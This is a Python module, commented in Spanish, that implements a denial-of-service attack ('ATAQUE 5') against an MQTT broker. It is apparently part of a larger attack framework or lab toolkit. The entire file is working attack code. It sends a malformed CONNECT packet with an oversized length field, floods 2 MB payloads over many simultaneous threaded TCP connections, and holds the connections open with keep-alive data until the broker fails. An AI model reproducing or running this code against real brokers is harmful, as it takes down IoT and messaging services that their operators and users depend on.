import socket
import threading
import time
from typing import Tuple

from config import MQTT_HOST, MQTT_PORT, ATTACK5_THREADS, ATTACK5_INTERVAL
from attacks.base import BaseAttack
from utils import add_event

# Payload MQTT CONNECT con client_id de 16 bytes (paquete válido)
_INIT_PAYLOAD = (
    b"\x10\xff\xff\xff\x0f\x00\x04\x4d\x51\x54\x54"
    b"\x04\x02\x00\x0a\x00\x10"
    b"\x43\x36\x38\x4e\x30\x31\x77\x75\x73\x4a\x31\x66\x78\x75\x38\x58"
)
# Payload de datos masivo (2 MB) para saturar el broker
_FLOOD_PAYLOAD  = bytes(2_097_152)
# Payload de keep-alive (1 KB)
_KEEP_PAYLOAD   = bytes(1024)


class Attack5(BaseAttack):
    """Ataque 5: DoS al broker MQTT.

    Abre múltiples conexiones TCP simultáneas enviando un payload de 2 MB
    para saturar el broker y provocar denegación de servicio.
    Basado en mqttexploit.py.
    """

    def __init__(self):
        super().__init__('attack5', 'ATAQUE 5 (BROKER DoS)', ATTACK5_INTERVAL)
        self._stats_lock = threading.Lock()
        self._created  = 0
        self._closed   = 0
        self._fails    = 0

    def _reset_stats(self):
        with self._stats_lock:
            self._created = 0
            self._closed  = 0
            self._fails   = 0

    def _send_connection(self):
        """Abre una conexión TCP y envía el flood payload."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(5)
            sock.connect((MQTT_HOST, MQTT_PORT))
        except Exception:
            with self._stats_lock:
                self._fails += 1
            return

        try:
            ret = sock.send(_INIT_PAYLOAD)
            if ret <= 0:
                return

            # Envía el payload masivo varias veces
            for _ in range(15):
                if not self.running:
                    break
                ret = sock.send(_FLOOD_PAYLOAD)
                if ret <= 0:
                    break
                time.sleep(0.1)

            # Mantiene la conexión abierta mientras el ataque sigue activo
            while self.running:
                ret = sock.send(_KEEP_PAYLOAD)
                if ret <= 0:
                    break
                time.sleep(0.3)
        except Exception:
            pass
        finally:
            with self._stats_lock:
                self._closed += 1
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            sock.close()

    def execute_attack(self) -> Tuple[bool, str, bool]:
        """Lanza una oleada de conexiones TCP simultáneas."""
        launched = 0
        for _ in range(ATTACK5_THREADS):
            if not self.running:
                break
            try:
                t = threading.Thread(
                    target=self._send_connection,
                    daemon=True,
                    name='attack5-conn'
                )
                t.start()
                launched += 1
            except Exception:
                pass

        with self._stats_lock:
            self._created += launched
            running = self._created - self._closed - self._fails

        add_event('warn',
            f'DoS: {launched} conexiones lanzadas | '
            f'activas≈{running} cerradas={self._closed} fallos={self._fails}'
        )

        # Si quedan muy pocas conexiones activas el broker ya cayó o bloqueó
        if running < 10 and self._created > ATTACK5_THREADS:
            add_event('info', 'DoS: pocas conexiones activas, el broker puede haber caído')

        return True, f'{launched} conexiones lanzadas', False

    def start(self):
        self._reset_stats()
        return super().start()
